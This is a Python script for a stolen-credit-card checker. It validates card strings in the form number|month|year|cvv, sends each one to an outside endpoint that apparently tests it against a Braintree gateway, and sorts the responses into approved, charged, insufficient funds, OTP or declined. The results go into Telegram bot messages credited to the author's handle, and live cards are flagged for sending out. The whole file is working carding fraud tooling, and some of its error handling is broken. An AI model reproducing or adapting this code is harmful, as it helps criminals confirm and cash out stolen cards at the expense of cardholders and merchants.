import requests,time,json

def luhn_check(card_number):
    digits = [int(digit) for digit in card_number.replace(" ", "")][::-1]
    checksum = 0
    for i, digit in enumerate(digits):
	    if i % 2 == 1:
	        digit *= 2
	        if digit > 9:
		          	digit -= 9
	    checksum += digit
    return checksum % 10 == 0

def process_card_b(card_data):
    start_time = time.time()
    session = requests.Session()
    try:
	    cc, mes, ano, cvv = map(str.strip, card_data.split('|'))
	    if not luhn_check(cc): return f"{card_data}","Faild in luhn check",False,"5",None
    except Exception:
    	return f"{card_data}","Bad Format",False,"5",None
    card = card_data
    last4 = cc[-4:]
    if cc.startswith("4"):
        card_brand = "Visa"
    elif cc.startswith("5"):
        card_brand = "MasterCard"
    if mes.startswith("0"):
    	mes = mes.lstrip("0")
#——————————————————————#
    try:
        card.replace("\r","")
        response2 = session.post("https://alflim.org/mos/cv.php?lista="+card_data)
    except Exception:
#——————————————————————#
    	end_time = time.time()
    	execution_time = end_time - start_time
    	msg_text = response2.json()["Response"]
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
    	return f"{card_data}",f"{msg_text}",False,5,f"{bot_msg}"
#——————————————————————#
    response2_text = response2.text
    end_time = time.time()
    execution_time = end_time - start_time
    
    send_by_bot = False
    msg_text = response2.json()["Response"]
    add_num = 5
    bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══
	{response2.text}      """
    if "DECLINED" in response2_text and "Gateway Rejected: risk_threshold" not in response2_text and "Card Issuer Declined CVV" not in response2_text:
        msg_text = response2.json()["Response"]
        bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══     """
#——————————————————————#
    elif "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗖𝗡 ✅" in response2_text or "Card Issuer Declined CVV" in response2_text:
        msg_text = response2.json()["Response"]
        send_by_bot = True
        bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗖𝗡 ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══       """
        add_num = 4
#——————————————————————#
    elif "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗩𝗩 ✅" in response2_text:
    	msg_text = response2.json()["Response"]
    	send_by_bot = True
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗩𝗩 ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
	bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══      """
    	add_num = 3
    	
    elif "succeeded" in response2_text or "Membership Confirmation" in response2_text or "Thank you for your support!" in response2_text or "Thank you for your donation" in response2_text or "/wishlist-member/?reg=" in response2_text or "Thank You" in response2_text or "Aprroved ✅" in response2_text or "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" in response2_text:
    	msg_text = response2.json()["Response"]
    	send_by_bot = True
    	
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : CHARGED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══       """
    	add_num = 1
    	
    elif "Insufficient Funds ✅" in response2_text:
    	msg_text = response2.json()["Response"]
    	send_by_bot = True
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : Insufficient Funds ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══         """
    	add_num = 2
    	
    elif """"next_action": {
		"type": "use_Braintree _sdk",""" in response2_text or "Braintree _3ds2_fingerprint" in response2_text:
    	add_num = 6
    	msg_text = "OTP"
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : OTP ❌
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══       """
    elif "risk_threshold" in response2_text:
    	msg_text = response2.json()["Response"]
    	send_by_bot = True
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : Gateway Rejected: risk_threshold
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══       """
    	add_num = 6
    	send_by_bot = False
    	
    else:
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Braintree 
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══   """
    	print(response2.text)
    	return f"{card_data}","Unkwon Response.",send_by_bot,5,f"{bot_msg}"
    	
    return f"{card_data}",f"{msg_text}",send_by_bot,add_num,f"{bot_msg}"